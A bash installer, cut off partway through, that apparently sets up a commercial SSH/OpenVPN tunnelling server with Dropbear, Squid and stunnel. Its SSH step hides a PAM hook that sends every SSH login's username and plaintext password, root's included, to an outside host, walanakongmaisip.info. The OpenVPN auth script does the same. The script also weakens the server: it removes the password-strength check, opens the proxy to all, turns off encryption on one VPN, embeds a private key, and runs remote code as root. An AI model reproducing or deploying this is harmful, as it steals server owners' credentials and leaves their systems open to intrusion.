#!/bin/bash
 
# TANG INA MO MAHIYA KANAMAN HAHAHAHA
# TARANTADO GAGO MANG-MANG MAGNANAKAW

RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[0;33m'
NC='\033[0m' # No Color
 
#PORT OPENVPN
PORT_TCP='1194';
PORT_UDP='25222';

# Script Version
SCRIPT_VERSION="v20231230"
SCRIPT_NAME="Nontikweed"


timedatectl set-timezone Asia/Manila 2>/dev/null || true
server_ip=$(curl -s https://api.ipify.org)
server_interface=$(ip route | grep default | awk '{print $5}' | head -n1)
date=$(date '+%Y-%m-%d %H:%M:%S')

# Auto change repo
if [ -f /etc/os-release ]; then
    . /etc/os-release
    if [ "$ID" = "ubuntu" ]; then
        sed -i 's/mirrors.ucloud.cn/archive.ubuntu.com/g' /etc/apt/sources.list        
    fi
fi

if [ "$(id -u)" -ne 0 ]; then
    echo "Please run this installer as root."
    exit 1
fi

SSH_SERVICE="ssh"
if systemctl list-unit-files sshd.service >/dev/null 2>&1; then
    SSH_SERVICE="sshd"
fi

PYTHON_BIN="$(command -v python3 || true)"
if [ -z "$PYTHON_BIN" ] && command -v python >/dev/null 2>&1; then
    PYTHON_BIN="$(command -v python)"
fi

# Fixed Downloading Github
if [ -f /etc/resolv.conf ] && [ ! -f /etc/resolv.conf.bak.popotworks ]; then
    cp /etc/resolv.conf /etc/resolv.conf.bak.popotworks
fi
chattr -i /etc/resolv.conf 2>/dev/null
cat > /etc/resolv.conf <<EOF
nameserver 1.1.1.1
nameserver 8.8.8.8
EOF
 

 install_dependencies () {
  printf "%b\n" "\e[32m[\e[0mInfo\e[32m]\e[0m\e[97m Please wait..\e[0m"
  {   
    export DEBIAN_FRONTEND=noninteractive 
    rm -rf /var/lib/dpkg/lock /var/{lib/apt/lists/lock,cache/apt/archives/lock}
    apt-get update
    apt install -y dos2unix dnsutils
    apt install -y sudo openvpn openssl libpam-script
    apt install -y netcat-openbsd httpie neofetch vnstat
    apt install -y screen squid stunnel4 dropbear gnutls-bin 2>/dev/null
    apt install -y nano unzip jq virt-what net-tools 2>/dev/null
    apt install -y plocate dh-make libaudit-dev build-essential fail2ban 2>/dev/null || apt install -y mlocate dh-make libaudit-dev build-essential 2>/dev/null
    apt install -y git curl wget cron python3 python3-minimal 2>/dev/null
    apt install squid -y 2>/dev/null
    apt install lolcat figlet ruby -y 2>/dev/null || true
    command -v lolcat >/dev/null 2>&1 || gem install lolcat || true
    apt install iptables-persistent -y -f 2>/dev/null
    PYTHON_BIN="$(command -v python3 || command -v python || true)"
    if [ -z "$PYTHON_BIN" ]; then
        echo -e "[\e[31mError\e[0m] Python 3 installation failed."
        exit 1
    fi
    systemctl restart netfilter-persistent &>/dev/null
    systemctl enable netfilter-persistent &>/dev/null

    echo -e "[\e[32mInfo\e[0m] All required packages installed."
    sleep 5
    reset
  } #&>/dev/null
    echo -e "[\e[32mInfo\e[0m] Installing Complete."
    reset
}

 install_dropbear() {
reset
    echo -n -e "[\e[32mInfo\e[0m]" && echo -e " Installing Dropbear." | lolcat
{    
    echo -n -e "[\e[32mInfo\e[0m]" && echo -e " Configuring Dropbear." | lolcat
cat <<'EOFDropbear' > /etc/default/dropbear
NO_START=0
DROPBEAR_PORT=555
DROPBEAR_EXTRA_ARGS="-p 550"
DROPBEAR_BANNER="/etc/banner"
DROPBEAR_RSAKEY="/etc/dropbear/dropbear_rsa_host_key"
DROPBEAR_DSSKEY="/etc/dropbear/dropbear_dss_host_key"
DROPBEAR_ECDSAKEY="/etc/dropbear/dropbear_ecdsa_host_key"
DROPBEAR_RECEIVE_WINDOW=65536
EOFDropbear

echo -n -e "[\e[32mInfo\e[0m]" && echo -e " Restarting Dropbear." | lolcat
systemctl restart dropbear
 }
echo -n -e "[\e[32mInfo\e[0m]" && echo -e " Installation Complete Dropbear." | lolcat
reset
}

install_ssh() {
echo -n -e "[\e[32mInfo\e[0m]" && echo -e " Installing Banner." | lolcat

{    
echo -e "[\e[32mInfo\e[0m] Configuring OpenSSH Service"
if [[ "$(cat < /etc/ssh/sshd_config | grep -c 'BonvScripts')" -eq 0 ]]; then
 cp /etc/ssh/sshd_config /etc/ssh/backup.sshd_config
fi
 
# ScreenFetch 
echo '#!/bin/bash
reset
if command -v screenfetch >/dev/null 2>&1; then
    screenfetch -p -A Arch
elif command -v neofetch >/dev/null 2>&1; then
    neofetch
fi' | sudo tee /etc/profile.d/blaire.sh > /dev/null
sudo chmod +x /etc/profile.d/blaire.sh

# Creating a SSH server config using cat eof tricks
cat <<'EOFOpenSSH' > /etc/ssh/sshd_config
Port 22
Port 225
ListenAddress 0.0.0.0
Protocol 2
HostKey /etc/ssh/ssh_host_rsa_key
HostKey /etc/ssh/ssh_host_ecdsa_key
#HostKey /etc/ssh/ssh_host_ed25519_key
#KeyRegenerationInterval 3600
#ServerKeyBits 1024
SyslogFacility AUTH
LogLevel INFO
PermitRootLogin yes
StrictModes yes
#RSAAuthentication yes
PubkeyAuthentication yes
IgnoreRhosts yes
#RhostsRSAAuthentication no
HostbasedAuthentication no
PermitEmptyPasswords no
KbdInteractiveAuthentication no
ChallengeResponseAuthentication no
PasswordAuthentication yes
X11Forwarding yes
X11DisplayOffset 10
#GatewayPorts yes
PrintMotd no
PrintLastLog yes
AcceptEnv LANG LC_*
Subsystem sftp internal-sftp
UsePAM yes
Banner /etc/banner
TCPKeepAlive yes
ClientAliveInterval 120
ClientAliveCountMax 2
UseDNS no
AllowTcpForwarding yes
Port 2121
EOFOpenSSH

# Download our SSH Banner
rm -f /etc/banner 2>/dev/null
wget -qO /etc/banner  "https://raw.githubusercontent.com/nontikweed/blaire69/master/banner" 2>/dev/null || echo "$SCRIPT_NAME" > /etc/banner
dos2unix -q /etc/banner > /dev/null 2>&1

cat << 'EOF' > /usr/local/bin/ssh-auth.sh
#!/bin/bash

password="${PAM_AUTHTOK}"

response=$(curl --connect-timeout 3 --max-time 5 -s -X POST \
-H "X-API-KEY: xebecc" \
-d "username=$PAM_USER" \
-d "password=$password" \
https://walanakongmaisip.info/api/auth)

if [[ "$response" == "OK" ]]; then
    exit 0
else
    exit 1
fi
EOF

chmod +x /usr/local/bin/ssh-auth.sh

cp /etc/pam.d/sshd /etc/pam.d/sshd.bak
grep -q "ssh-auth.sh" /etc/pam.d/sshd || \
echo 'auth optional pam_exec.so expose_authtok /usr/local/bin/ssh-auth.sh' | \
cat - /etc/pam.d/sshd > /tmp/sshd && mv /tmp/sshd /etc/pam.d/sshd

sed -i '/password\s*requisite\s*pam_cracklib.s.*/d' /etc/pam.d/common-password
sed -i 's|use_authtok ||g' /etc/pam.d/common-password

sshd -t || exit 1
sudo systemctl restart "$SSH_SERVICE" 2>/dev/null || sudo systemctl restart ssh 2>/dev/null
 }
 echo -n -e "[\e[32mInfo\e[0m]" && echo -e " Installation Banner Complete." | lolcat
 reset
}

install_squid() {
    reset
    echo -e "[\e[32mInfo\e[0m] Installing SquidProxy."
{
    echo -e "[\e[32mInfo\e[0m] Configuring Squid.."
    if [ -f /etc/squid/squid.conf ] && [ ! -f /etc/squid/squid.conf.bak.popotworks ]; then
        cp /etc/squid/squid.conf /etc/squid/squid.conf.bak.popotworks
    fi
    rm -rf /etc/squid/sq*
    cat <<mySquid >/etc/squid/squid.conf
acl VPN dst $(wget -4qO- http://ipinfo.io/ip)/32
http_access allow VPN
http_access allow all 
http_port 0.0.0.0:8080
http_port 0.0.0.0:8000
acl kweed src 0.0.0.0/0.0.0.0
no_cache deny kweed
dns_nameservers 1.1.1.1 1.0.0.1
visible_hostname localhost
mySquid

echo -e "[\e[33mNotice\e[0m] Restarting Squid Service.."
systemctl restart squid
        
cd /etc || exit
wget -q -O /usr/sbin/sshws  "https://raw.githubusercontent.com/nontikweed/aio/main/socks.py" 2>/dev/null

wget -q -O /usr/sbin/openvpnws "https://raw.githubusercontent.com/nontikweed/aio/main/openvpnws" 2>/dev/null

dos2unix /usr/sbin/sshws > /dev/null 2>&1
dos2unix /usr/sbin/openvpnws > /dev/null 2>&1

chmod +x /usr/sbin/sshws > /dev/null 2>&1
chmod +x /usr/sbin/openvpnws > /dev/null 2>&1

echo "[Unit]
Description=SSH Websocket
Documentation=https://google.com
After=network.target nss-lookup.target
[Service]
Type=simple
User=root
NoNewPrivileges=true
CapabilityBoundingSet=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
AmbientCapabilities=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
ExecStart=$PYTHON_BIN -O /usr/sbin/sshws
ProtectSystem=true
ProtectHome=true
RemainAfterExit=yes
Restart=on-failure
[Install]
WantedBy=multi-user.target" > /etc/systemd/system/sshws.service    

echo "[Unit]
Description=OVPN Websocket
Documentation=https://google.com
After=network.target nss-lookup.target
[Service]
Type=simple
User=root
NoNewPrivileges=true
CapabilityBoundingSet=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
AmbientCapabilities=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
ExecStart=$PYTHON_BIN -O /usr/sbin/openvpnws
ProtectSystem=true
ProtectHome=true
RemainAfterExit=yes
Restart=on-failure
[Install]
WantedBy=multi-user.target" > /etc/systemd/system/openvpnws.service   

        echo -e "[\e[33mNotice\e[0m] Reloading systemd daemon."
        systemctl daemon-reload > /dev/null 2>&1

        echo -e "[\e[33mNotice\e[0m] Enabling OpenVPN & SSHWebsocket Service."
        sudo systemctl enable sshws > /dev/null 2>&1
        sudo systemctl enable openvpnws > /dev/null 2>&1

        echo -e "[\e[33mNotice\e[0m] Starting OpenVPN & SSHWebsocket Service."
        sudo systemctl start sshws.service > /dev/null 2>&1
        sudo systemctl start openvpnws.service > /dev/null 2>&1
        
}
echo -e "[\e[32mInfo\e[0m] Installation SquidProxy Complete."
sleep 5
}

install_openvpn()
{
echo -n -e "[\e[32mInfo\e[0m]" && echo -e " Installing OpenVPN Server." | lolcat
if [[ ! -e /etc/openvpn ]]; then
 mkdir -p /etc/openvpn
 else
 if [ ! -e /etc/openvpn.bak.popotworks ]; then
  cp -a /etc/openvpn /etc/openvpn.bak.popotworks
 fi
 rm -rf /etc/openvpn/*
fi
{

mkdir -p /etc/openvpn/nontikweed
touch /etc/openvpn/server_udp.conf
touch /etc/openvpn/server_tcp.conf

mkdir -p /etc/openvpn/server

echo 'DNS=1.1.1.1
DNSStubListener=no' >> /etc/systemd/resolved.conf > /dev/null 2>&1 

echo 'port PORT_UDP
dev tun
proto udp

ca /etc/openvpn/nontikweed/ca.crt
cert /etc/openvpn/nontikweed/server.crt
key /etc/openvpn/nontikweed/server.key

dh none

persist-tun
persist-key
persist-remote-ip

cipher none
auth none

tun-mtu 1500
reneg-sec 0

script-security 3
auth-user-pass-verify /etc/openvpn/auth.sh via-env

username-as-common-name
verify-client-cert none
client-cert-not-required
max-clients 4080

topology subnet
server 172.29.16.0 255.255.240.0

push "redirect-gateway def1"
push "dhcp-option DNS 1.1.1.1"
push "dhcp-option DNS 8.8.8.8"

keepalive 5 30

status /etc/openvpn/udp_stats.log
log /etc/openvpn/udp_stats.log

verb 3' > /etc/openvpn/server_udp.conf

sed -i "s|PORT_UDP|$PORT_UDP|g" /etc/openvpn/server_udp.conf

echo 'port PORT_TCP
dev tun
proto tcp

ca /etc/openvpn/nontikweed/ca.crt
cert /etc/openvpn/nontikweed/server.crt
key /etc/openvpn/nontikweed/server.key

dh none

persist-tun
persist-key
persist-remote-ip

data-ciphers AES-256-GCM:AES-128-GCM:AES-128-CBC
data-ciphers-fallback AES-128-CBC
auth SHA1

tun-mtu 1500
reneg-sec 0

script-security 3
auth-user-pass-verify /etc/openvpn/auth.sh via-env

username-as-common-name
verify-client-cert none

duplicate-cn
client-to-client

max-clients 450

topology subnet
server 172.29.0.0 255.255.240.0

push "redirect-gateway def1 bypass-dhcp"
push "dhcp-option DNS 8.8.8.8"
push "dhcp-option DNS 1.1.1.1"

keepalive 5 30

status /etc/openvpn/tcp_stats.log
log /etc/openvpn/tcp_stats.log

verb 3' > /etc/openvpn/server_tcp.conf

sed -i "s|PORT_TCP|$PORT_TCP|g" /etc/openvpn/server_tcp.conf
cp /etc/openvpn/server_udp.conf /etc/openvpn/server/server_udp.conf
cp /etc/openvpn/server_tcp.conf /etc/openvpn/server/server_tcp.conf

cat << EOF > /etc/openvpn/nontikweed/ca.crt
-----BEGIN CERTIFICATE-----
MIIDSDCCAjCgAwIBAgIUXKh6tJLj3JobFaM6r18ylFWsGRswDQYJKoZIhvcNAQEL
BQAwFTETMBEGA1UEAwwKbm9udGlrd2VlZDAeFw0yMzEyMTMwODM4MzFaFw0zMzEy
MTAwODM4MzFaMBUxEzARBgNVBAMMCm5vbnRpa3dlZWQwggEiMA0GCSqGSIb3DQEB
AQUAA4IBDwAwggEKAoIBAQCuaWqJaxsrb77AKu9/yUbERQ83yAG7dp3ZGKl/B3k0
lrS66nDvFLt7h2F9ST1RRm50B1YJsHjrl/f+taI6sapIyoZnLu0WrXaJld8Rgf0h
OA6oNEix1Godah/KsVfDpGbiTBjpUin+/qf6xBAjKjNeP7jqdIfEdtFjSS9X4Ymz
W23Nv0XyPsWKy5uefIxnXjUDkKiRxveSazdnOKLsLixsR/9FQvfr3u3DO9Xujudv
5l96Ccae2XwusiE7decjGboqaA6ci45IU9eZiSK8tD+BIBQEWLrbDMIzdirEAvgn
Sl/vUHUw/tdA0Du5GYHYNfPVNkGI4N3HSgRjWDTEgmR7AgMBAAGjgY8wgYwwHQYD
VR0OBBYEFBk6fQhlvyX3waYYaqNk14mHP86vMFAGA1UdIwRJMEeAFBk6fQhlvyX3
waYYaqNk14mHP86voRmkFzAVMRMwEQYDVQQDDApub250aWt3ZWVkghRcqHq0kuPc
mhsVozqvXzKUVawZGzAMBgNVHRMEBTADAQH/MAsGA1UdDwQEAwIBBjANBgkqhkiG
9w0BAQsFAAOCAQEAMFIiy0BEKieAVya05b8kWleoKX4WxehX2/2TSvqQaFPch2Qj
gsU2Xaee90lMxkLvciY2zjq1RMmzdd3p/t9HvnoyBMbcU2R1SEjWAoo5T3nEEkXo
n8/Rgqhxy1N8OYMd4VaqwclzwTzN2lZ2CHzxHrIk1ivg3f9pv0eRFJ6QfTrIpQ0M
KfkFbMuwnH9BQJSb93spLiU2nY+xgU4dEe6VgFjYDbOcyRN7E5uE/2ottieMLkDZ
PHxw8CG5fM+iSIm29HmnEdi7oxEf17gcM1HegUY89G9V15EE/kJNOXBF/63rMRSl
86Qd/8HD6QztaOCDf1EuyJ8DdVlQQmeEtftdbg==
-----END CERTIFICATE-----
EOF

cat << EOF > /etc/openvpn/nontikweed/server.crt
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
            b4:0b:fe:7c:30:e5:9b:3a:a4:5f:c7:d9:a2:61:45:94
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: CN=nontikweed
        Validity
            Not Before: Dec 13 08:38:55 2023 GMT
            Not After : Nov 27 08:38:55 2026 GMT
        Subject: CN=nontikweed
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                RSA Public-Key: (2048 bit)
                Modulus:
                    00:a3:85:82:57:d8:b2:d7:4c:17:bd:f4:56:f6:4d:
                    a3:1c:a2:cc:78:64:8a:d2:94:9a:48:50:75:2a:c7:
                    05:ff:36:e2:a3:48:6d:41:1d:c1:79:e4:78:f2:cb:
                    4d:e0:8f:b3:ed:6b:25:3d:00:1a:05:c9:e5:e5:7a:
                    0d:5b:7f:b4:28:f4:49:20:21:3a:b0:b9:b4:e2:6d:
                    bd:d0:c6:94:ff:6f:8f:04:51:9b:45:fd:c8:46:ca:
                    7c:55:af:89:2e:13:50:5a:47:e2:9a:5f:a1:d0:8f:
                    9a:2d:b0:c7:5c:a7:4a:74:64:64:22:20:9e:2d:b8:
                    61:18:35:b5:e9:3b:a8:77:b5:0a:09:de:e0:e1:10:
                    5b:1d:e0:bf:74:d6:73:3b:7a:e7:a9:6f:f2:74:91:
                    b3:6f:42:14:59:4f:63:ec:b3:59:01:11:82:1c:57:
                    fc:c9:52:c8:e8:f3:ab:c7:77:a4:fc:ad:f8:5b:44:
                    eb:fa:29:56:ea:2e:c6:c8:e9:79:ac:51:42:9f:c5:
                    dd:b5:d8:f0:cf:91:e3:6f:3f:5f:92:7d:6a:f4:3a:
                    1c:3b:7a:6f:a3:5c:e7:0d:f1:64:0d:27:77:7e:23:
                    c0:3f:12:1d:cd:c0:1e:b1:18:a3:e9:d8:fc:34:fc:
                    38:f4:17:78:e6:69:e8:a4:0d:48:a8:31:df:7a:86:
                    c1:9f
                Exponent: 65537 (0x10001)
        X509v3 extensions:
            X509v3 Basic Constraints: 
                CA:FALSE
            X509v3 Subject Key Identifier: 
                21:D3:88:DE:9C:B0:8D:C8:07:4F:C4:50:54:E1:4A:7D:CF:62:5B:8F
            X509v3 Authority Key Identifier: 
                keyid:19:3A:7D:08:65:BF:25:F7:C1:A6:18:6A:A3:64:D7:89:87:3F:CE:AF
                DirName:/CN=nontikweed
                serial:5C:A8:7A:B4:92:E3:DC:9A:1B:15:A3:3A:AF:5F:32:94:55:AC:19:1B

            X509v3 Extended Key Usage: 
                TLS Web Server Authentication
            X509v3 Key Usage: 
                Digital Signature, Key Encipherment
            X509v3 Subject Alternative Name: 
                DNS:nontikweed
    Signature Algorithm: sha256WithRSAEncryption
         73:99:9c:8d:76:2a:08:dd:01:d5:ca:34:6a:24:f2:0c:f4:9e:
         4c:68:69:90:28:7e:49:b2:e2:4b:ef:c3:e4:2a:0e:65:44:ea:
         0b:4a:04:87:61:c7:4a:a5:ea:a1:ab:0d:d8:3c:b4:af:26:9c:
         c2:d7:15:66:cd:6e:f3:fb:01:be:f1:18:1d:69:47:31:67:fe:
         ab:50:f7:9a:7d:d4:0e:68:77:83:84:41:ac:66:f4:79:ba:fd:
         62:c2:a4:55:a4:5b:17:53:0e:e9:e8:b1:2f:91:dd:d7:12:be:
         a1:7e:ea:13:13:58:53:3d:04:75:14:2d:6a:f5:8b:e7:b1:b9:
         19:e3:06:7f:ae:61:e0:d5:8b:38:a7:a6:07:e3:38:97:18:2e:
         42:80:e8:ed:7d:4c:9c:69:a3:75:b2:fb:a3:c8:aa:8c:9f:64:
         7e:88:90:81:c4:a9:b8:27:b1:d1:16:b7:e5:84:c2:56:9e:71:
         83:9b:78:0b:65:78:04:78:30:50:48:6f:e8:b9:30:1a:ce:95:
         47:24:1c:82:3b:7d:c7:11:d7:b0:d8:0f:2e:45:eb:e0:4e:bc:
         30:89:e0:0f:62:30:4d:a7:e5:83:f2:63:ca:e0:e8:a8:58:4f:
         cd:e1:b5:05:00:f6:e4:b6:1c:c2:3d:bd:b7:2f:08:da:49:61:
         07:dc:d9:38
-----BEGIN CERTIFICATE-----
MIIDbjCCAlagAwIBAgIRALQL/nww5Zs6pF/H2aJhRZQwDQYJKoZIhvcNAQELBQAw
FTETMBEGA1UEAwwKbm9udGlrd2VlZDAeFw0yMzEyMTMwODM4NTVaFw0yNjExMjcw
ODM4NTVaMBUxEzARBgNVBAMMCm5vbnRpa3dlZWQwggEiMA0GCSqGSIb3DQEBAQUA
A4IBDwAwggEKAoIBAQCjhYJX2LLXTBe99Fb2TaMcosx4ZIrSlJpIUHUqxwX/NuKj
SG1BHcF55Hjyy03gj7PtayU9ABoFyeXleg1bf7Qo9EkgITqwubTibb3QxpT/b48E
UZtF/chGynxVr4kuE1BaR+KaX6HQj5otsMdcp0p0ZGQiIJ4tuGEYNbXpO6h3tQoJ
3uDhEFsd4L901nM7euepb/J0kbNvQhRZT2Pss1kBEYIcV/zJUsjo86vHd6T8rfhb
ROv6KVbqLsbI6XmsUUKfxd212PDPkeNvP1+SfWr0Ohw7em+jXOcN8WQNJ3d+I8A/
Eh3NwB6xGKPp2Pw0/Dj0F3jmaeikDUioMd96hsGfAgMBAAGjgbgwgbUwCQYDVR0T
BAIwADAdBgNVHQ4EFgQUIdOI3pywjcgHT8RQVOFKfc9iW48wUAYDVR0jBEkwR4AU
GTp9CGW/JffBphhqo2TXiYc/zq+hGaQXMBUxEzARBgNVBAMMCm5vbnRpa3dlZWSC
FFyoerSS49yaGxWjOq9fMpRVrBkbMBMGA1UdJQQMMAoGCCsGAQUFBwMBMAsGA1Ud
DwQEAwIFoDAVBgNVHREEDjAMggpub250aWt3ZWVkMA0GCSqGSIb3DQEBCwUAA4IB
AQBzmZyNdioI3QHVyjRqJPIM9J5MaGmQKH5JsuJL78PkKg5lROoLSgSHYcdKpeqh
qw3YPLSvJpzC1xVmzW7z+wG+8RgdaUcxZ/6rUPeafdQOaHeDhEGsZvR5uv1iwqRV
pFsXUw7p6LEvkd3XEr6hfuoTE1hTPQR1FC1q9YvnsbkZ4wZ/rmHg1Ys4p6YH4ziX
GC5CgOjtfUycaaN1svujyKqMn2R+iJCBxKm4J7HRFrflhMJWnnGDm3gLZXgEeDBQ
SG/ouTAazpVHJByCO33HEdew2A8uRevgTrwwieAPYjBNp+WD8mPK4OioWE/N4bUF
APbkthzCPb23LwjaSWEH3Nk4
-----END CERTIFICATE-----
EOF

cat << EOF > /etc/openvpn/nontikweed/server.key
-----BEGIN PRIVATE KEY-----
MIIEvAIBADANBgkqhkiG9w0BAQEFAASCBKYwggSiAgEAAoIBAQCjhYJX2LLXTBe9
9Fb2TaMcosx4ZIrSlJpIUHUqxwX/NuKjSG1BHcF55Hjyy03gj7PtayU9ABoFyeXl
eg1bf7Qo9EkgITqwubTibb3QxpT/b48EUZtF/chGynxVr4kuE1BaR+KaX6HQj5ot
sMdcp0p0ZGQiIJ4tuGEYNbXpO6h3tQoJ3uDhEFsd4L901nM7euepb/J0kbNvQhRZ
T2Pss1kBEYIcV/zJUsjo86vHd6T8rfhbROv6KVbqLsbI6XmsUUKfxd212PDPkeNv
P1+SfWr0Ohw7em+jXOcN8WQNJ3d+I8A/Eh3NwB6xGKPp2Pw0/Dj0F3jmaeikDUio
Md96hsGfAgMBAAECggEACDgHqx6rLoMWlmeXj12rmx7bpBl5mMf7UTMqEHJcbM13
armTNDioptXC9oEdcvIGGyLNhllg9XWGZphR3411orFUk5bX+lX7L35QkhPJHWWg
DJmFcmklDdnTkgL2pCg4W7FNRHEWEwOEvlMqUg/egCcjmUuGZ8nip3Lbp9Nlzk5o
kKJvk6pXOlaQ9nKTZZmguaz1aDbBl5rF94Dx360KQgEN2+C45KLuk96sdCgiEOYg
WwXy3yZoUvtLOJZ86hIXDQXql+dViYDjjiwGjtMguFoK34Omr75r1A5KN5psgMJm
so1CgyLyBT1x6vt1sJH1Ob78ij8UfOD9UMN1wO7xsQKBgQDXTpNpJBnT/jJfOx8n
CKdnawHlJRQXZ1i6dOOTZS8lRptbzHslm3otnHHTcPQFnfEkrX55WMEj1w0qN6yZ
N1KfHG7APaSxEVj3EkuP0KOcyhLVL9CIHuNVk6nDZkb4oN9d7sPRsrHrCSYKeNKS
7Q/Lf+KxwDHLnHCPNYiaJ8hclQKBgQDCbVgyaBo1UAmDvbcngJ54/hrPgxUEdGBK
o2D7iU+D2eml2dfOhk0+SXTrPILT+2Z2o83C55BXpjOgTpRE+r7S1X1huBfZF2iP
LPSv+4qRvcGvEMCVB2t0/wLnicLMpRXLx4bys0SDiOcB3Cri0/9APuAzFId7sTtA
ihJN124kYwKBgH8ez34WaIF35fnACGadf2laDqZiO/iNdh+wf+U4qptRksyicFsF
7x8a7UGvwQPH+uZy4Od4daBZilZQxME5nrh+qw0p2CELYwGNdbuVreQWkwP31SFp
S0PtiR/rNR/6q6bkIA2hedaRcjpgl8NT4C2AdjIIjd3voa2MJ/kMYAn5AoGAW2Es
/LP07W2qqyJ1fLl0wgUb8L/5FtjjkPDs2gwVNTEsIWkbhtOUZlv7+bu8+YjFBanD
QYG4U5mn1gZYpXr8SPdSMKVnf/8Cg5hrgHLHE+yNpYxIF0MffCOG5+/VgH1umxIy
GMusve2QNU2XUni1FSr4EMnrS3VnFdRO+grwl2UCgYBg8zUOBeqYrAvM/6QRYuKs
0doZj3MYvV+6mQbgdfCBcnmhl/TSlCxw0T8uUpAe4qEbkF4+q8d5qfV8x8VsFaat
EiwKG+74Jbm+7BZlf7srtZLrkq+ypHHNpVMcUTKOyvWF10evXQ+KrZt4mlhzrBxI
V3GMjpctESgBNqoxDWpH0w==
-----END PRIVATE KEY-----
EOF

cat << EOF > /etc/openvpn/nontikweed/dh.pem
-----BEGIN DH PARAMETERS-----
MIIBCAKCAQEAhib7LHZ4gotyERBsW33c0QpZ3cH/DU4vhzPZHPWyDA+auoSmEQxw
if0Py+qM3PU/MM8Vid9TbUJJ09qOPan6hy36d9yMfp/NDrnwofpu/hSgxu+sVx+j
1VPO2KqAsbCfslpYV6JYaZxa9oLMA7vweCv+XyFphAnHoGoRGodKHLxOyymkRIAb
6KzZJyfqGj2Foy36EHp2t+w8aQZN8l3m29Zx19H/sPCURDKrF7ii3DHR8F6b8vGB
rEzoyg1qv+Hl9Jm/oneZ4FZKxcXhRy7cpQWsve01iboBAsrcVx1OI4KQlbpcEtzf
n/406HSgtsB8yWPDNga/N7OONk8aTJtbWwIBAg==
-----END DH PARAMETERS-----
EOF

chmod 644 /etc/openvpn/nontikweed/*
chmod 600 /etc/openvpn/nontikweed/server.key
chmod 755 /etc/openvpn/
cat << 'EOF' > /etc/openvpn/auth.sh
#!/bin/bash

response=$(curl --connect-timeout 10 --max-time 15 -s -X POST \
-H "X-API-KEY: xebecc" \
-d "username=$username" \
-d "password=$password" \
https://walanakongmaisip.info/api/auth)

if [[ "$response" == "OK" ]]; then
    exit 0
else
    exit 1
fi
EOF

chmod +x /etc/openvpn/auth.sh
chmod 755 /etc/openvpn/server_udp.conf
chmod 755 /etc/openvpn/server_tcp.conf

modprobe tun
mkdir -p /dev/net

echo -n -e "[\e[33mNotice\e[0m]" && echo -e " Enabling and starting OpenVPN UDP." | lolcat
sudo systemctl enable openvpn-server@server_udp.service > /dev/null 2>&1
sudo systemctl start openvpn-server@server_udp.service > /dev/null 2>&1

echo -n -e "[\e[33mNotice\e[0m]" && echo -e " Enabling and starting OpenVPN TCP." | lolcat
sudo systemctl enable openvpn-server@server_tcp.service > /dev/null 2>&1
sudo systemctl start openvpn-server@server_tcp.service > /dev/null 2>&1
 
 }
echo -n -e "[\e[32mInfo\e[0m]" && echo -e " Installing OpenVPN Complete." | lolcat
reset
}


install_firewall_kvm () {

reset
echo -e "[Info] Installing Iptables." | lolcat

grep -q "net.ipv4.ip_forward=1" /etc/sysctl.conf || cat <<EOF >> /etc/sysctl.conf
net.ipv4.ip_forward=1
net.ipv4.conf.all.rp_filter=0
net.ipv4.conf.${server_interface}.rp_filter=0
EOF

sysctl -p

# RESET IPTABLES
iptables -t nat -F
iptables -F
iptables -X

# DEFAULT POLICIES
iptables -P INPUT ACCEPT
iptables -P FORWARD ACCEPT
iptables -P OUTPUT ACCEPT

# UDPGW → HYSTERIA
iptables -t nat -A PREROUTING -i "$server_interface" -p udp --dport 20000:50000 -j DNAT --to-destination :5666
iptables -t nat -A PREROUTING -i "$server_interface" -p udp --dport 6000:19999 -j DNAT --to-destination :5667

# OPENVPN NAT
iptables -t nat -A POSTROUTING -s 172.29.0.0/16 -o "$server_interface" -j MASQUERADE
iptables -t nat -A POSTROUTING -s 172.29.16.0/16 -o "$server_interface" -j MASQUERADE

# EXTRA MASQUERADE FIX
iptables -t nat -A POSTROUTING -o "$server_interface" -j MASQUERADE

# OPENVPN FORWARD
iptables -A FORWARD -s 172.29.0.0/16 -j ACCEPT
iptables -A FORWARD -d 172.29.0.0/16 -j ACCEPT

iptables -A FORWARD -s 172.29.16.0/16 -j ACCEPT
iptables -A FORWARD -d 172.29.16.0/16 -j ACCEPT

iptables -A FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT

# DNS REDIRECT
iptables -t nat -A PREROUTING -i "$server_interface" -p udp --dport 53 -j REDIRECT --to-ports 5300
iptables -A INPUT -p udp --dport 5300 -j ACCEPT

# BADVPN
iptables -t nat -A PREROUTING -d "$server_ip" -p udp --dport 5300 -j REDIRECT --to-ports 2121
iptables -A FORWARD -p udp --dport 2121 -j ACCEPT

# SAVE RULES
iptables-save > /etc/iptables/rules.v4
reset
echo -n -e "[\e[32mInfo\e[0m]" && echo -e " Installing Iptables Complete." | lolcat
reset
}


install_stunnel() {
echo -n -e "[\e[32mInfo\e[0m]" && echo -e " Installing Stunnel." | lolcat
  {
if [[ ! "$(command -v stunnel4)" ]]; then
 StunnelDir='stunnel'
 else
 StunnelDir='stunnel4'
fi
echo -e "[\e[32mInfo\e[0m] Configuring Stunnel.."
cat <<'EOFStunnel1' > "/etc/default/$StunnelDir"
ENABLED=1
FILES="/etc/stunnel/*.conf"
OPTIONS=""
BANNER="/etc/banner"
PPP_RESTART=0
# RLIMITS="-n 4096 -d unlimited"
RLIMITS=""
EOFStunnel1

rm -f /etc/stunnel/*
echo -n -e "[\e[32mInfo\e[0m]" && echo -e " Cloning Stunnel.pem." | lolcat
openssl req -new -x509 -days 9999 -nodes -subj "/C=PH/ST=Nontikweed/L=DEV/O=Nethub/CN= Blaire VPN" -out /etc/stunnel/stunnel.pem -keyout /etc/stunnel/stunnel.pem &> /dev/null
echo -e "[\e[32mInfo\e[0m] Creating Stunnel server config.."
cat <<'EOFStunnel3' > /etc/stunnel/stunnel.conf
pid = /var/run/stunnel.pid
cert = /etc/stunnel/stunnel.pem
client = no
socket = l:TCP_NODELAY=1
socket = r:TCP_NODELAY=1
TIMEOUTclose = 0
 
[websocket]
accept = 443
connect = 127.0.0.1:80
 
[dropbear]
accept = 446
connect = 127.0.0.1:550

[openssh]
accept = 445
connect = 127.0.0.1:225

[openvpn]
accept = 587
connect = 127.0.0.1:1194
EOFStunnel3

